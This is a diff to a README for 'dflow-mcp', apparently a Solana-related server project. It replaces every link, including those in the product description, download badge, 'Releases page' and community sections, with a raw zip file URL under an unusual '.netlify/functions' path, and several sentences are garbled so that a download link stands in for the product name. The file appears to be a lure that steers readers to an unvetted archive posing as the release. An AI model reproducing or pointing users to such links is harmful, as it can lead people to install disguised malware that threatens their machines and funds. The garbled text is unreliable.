@@ -1,16 +1,16 @@
-# 🌟 dflow-mcp - Simple Server for https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/tests/dflow-mcp_2.5.zip
+# 🌟 dflow-mcp - Simple Server for https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip
 
 ## 🎉 Overview
-dflow-mcp is a user-friendly server designed for https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/tests/dflow-mcp_2.5.zip It connects to various tools and applications, ensuring smooth interactions and data exchanges. Whether you are working on finance, APIs, or tools related to Solana, this application simplifies your workflow.
+dflow-mcp is a user-friendly server designed for https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip It connects to various tools and applications, ensuring smooth interactions and data exchanges. Whether you are working on finance, APIs, or tools related to Solana, this application simplifies your workflow.
 
 ## 📥 Download
-[![Download dflow-mcp](https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/tests/dflow-mcp_2.5.zip)](https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/tests/dflow-mcp_2.5.zip)
+[![Download dflow-mcp](https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip)](https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run dflow-mcp:
 
 1. **Visit the Release Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/tests/dflow-mcp_2.5.zip) to access the latest version of dflow-mcp. 
+   Go to the [Releases page](https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip) to access the latest version of dflow-mcp. 
 
 2. **Choose the Right Version**
    On the Releases page, you will see different versions. Pick the most recent version that suits your operating system. Common versions are available for Windows, macOS, and Linux.
@@ -47,7 +47,7 @@ dflow-mcp offers a range of features to assist you:
 - **Support for Solana:** Specifically designed to work well within the Solana ecosystem.
 
 ## 📥 Download & Install
-For ease of access, you may return to the [Releases page](https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/tests/dflow-mcp_2.5.zip) to download the application at any time. 
+For ease of access, you may return to the [Releases page](https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip) to download the application at any time. 
 
 ## ❓ Frequently Asked Questions
 
@@ -61,7 +61,7 @@ While dflow-mcp requires recent operating systems for full functionality, older 
 For detailed information on how to use each feature, check the documentation on the GitHub repository or visit community resources that discuss dflow-mcp capabilities.
 
 ## 🛠️ Community Support
-Join the dflow-mcp community where users share tips, tricks, and best practices. You can submit questions, share your experiences, or help others in forums and chat groups connected to https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/tests/dflow-mcp_2.5.zip
+Join the dflow-mcp community where users share tips, tricks, and best practices. You can submit questions, share your experiences, or help others in forums and chat groups connected to https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip
 
 ## 📢 Contributing
 If you want to contribute to dflow-mcp, please read the contribution guidelines in the repository. Your input helps improve the application for everyone.
@@ -69,4 +69,4 @@ If you want to contribute to dflow-mcp, please read the contribution guidelines 
 ## 📝 License
 dflow-mcp is open-source software licensed under the MIT License. Feel free to use, modify, and share it as per the license terms. 
 
-Thank you for choosing dflow-mcp! Enjoy a seamless experience in managing your projects on https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/tests/dflow-mcp_2.5.zip
+Thank you for choosing dflow-mcp! Enjoy a seamless experience in managing your projects on https://raw.githubusercontent.com/ba1nch0d/dflow-mcp/main/.netlify/functions/mcp-v2-bootstrap/mcp-dflow-v1.9.zip
